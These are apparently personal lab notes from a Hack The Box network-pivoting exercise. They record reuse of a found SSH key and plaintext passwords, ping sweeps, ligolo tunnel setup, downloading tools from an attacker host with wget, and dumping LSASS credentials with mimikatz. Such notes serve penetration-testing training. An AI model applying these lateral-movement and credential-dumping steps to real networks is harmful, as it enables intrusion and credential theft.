![](/images/Pasted image 20250706004903.png)
### FOUND PRIVATE SSH KEY FOR WEBADMIN
copy to attacker and ssh 
```
ssh webadmin@ip
```
found cred file
```
webadmin@Blackwood:~$ cat for-admin-eyes-only 
creds to access server01 or other hosts
mlefay : Plain Human work!
```
view routing 
```
ifconfig

ens192:   172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
```

ping hosts:
`for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
``
`for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"`



```shell
webadmin@Blackwood:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=1.87 ms
```


#### start tunnel from pivot1

add a listener to run shells/ share folders
```
[Agent : webadmin@blackwood.local] » listener_add --addr  0.0.0.0:2000 --to  127.0.0.1:1111 --tcp                                                                                       
INFO[1122] Listener 0 created on remote agent!   
```


# Server01 (pivot 2)
# NMAP
download nmap to scan server01
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
```
wget http://10.10.16.40/nmap
```
## Experimenting with portscan
ill try to use the static binary provided in github repo and do a tunnel and compare the the output of my kali's proxied nmap withscripts and the limited andrew's static nmap
`run uploaded nmap file`
```
webadmin@Blackwood:~$ ./nmap 172.16.5.35 -Pn

PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds

```

### creating the tunnel
`ifconfig`
![](/images/Pasted image 20250705211820.png)

ligolo doesnt know what interface to use so lets specify
`im using ligolo-pivot1`

mlefay : Plain Human work!
#  server01 pivot2

Also dual homed: ![](/images/Pasted image 20250705214909.png)

# Hint: LSASS SERVICE
copy mimikatz
timeout when i tried to copy with wget or iwr so i used rdp clipboard

made a dump file and ran
```
sekurlsa::minidump lsass.DMP
sekurlsa::logonpasswords

```
![](/images/Pasted image 20250705225525.png)
using a powershell oneliner to discover live hosts
```
1..254 | ForEach-Object {
    $ip = "172.16.6.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip }
}

```
![](/images/Pasted image 20250705230711.png)
we know that 6.35 is us so lets try using mstc to acess the other hosts or
setup another agent so we can proxy our tools through

resolve hostnames
```
Resolve-DnsName -Type PTR -Name 172.16.6.25
```
ping
![](/images/Pasted image 20250705231519.png)
ping replies indicate a linux host and a windows host
lets try to login to the windows one with mstc
```
vfrank: Imply wet Unmasked!
```
i then need to create an interface for the pivot2 connection
ill call it ligolo-double or pivot2-if
```
sudo ip tuntap add user htb-ac-1402785 mode tun ligolo-double
sudo ip link set ligolo-double up
```
created a listener to forward traffic from .5 to kali
```
[Agent : webadmin@blackwood.local] » listener_add  --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
INFO[3554] Listener 3 created on remote agent!     
```
but no session was created... why? cause you likely forgot to create the second interface (`ligolo-double`)

![](/images/Pasted image 20250705235144.png)

final map:

